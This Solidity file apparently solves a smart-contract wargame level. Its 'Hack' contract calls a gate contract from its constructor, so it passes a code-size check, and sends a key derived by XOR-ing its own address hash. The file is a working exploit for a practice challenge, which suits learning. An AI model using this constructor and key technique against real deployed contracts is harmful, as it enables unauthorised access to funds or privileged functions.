// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGate {
	function enter(bytes8 _gateKey) external returns (bool);
}

contract Hack {
	
	constructor() {
		IGate gate = IGate(address(0x1F0203507bC72630A39B369F62AA6Bd2ce14806B));
		uint64 first = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
		uint64 key = first ^ type(uint64).max;
		gate.enter(bytes8(key));
	}
}
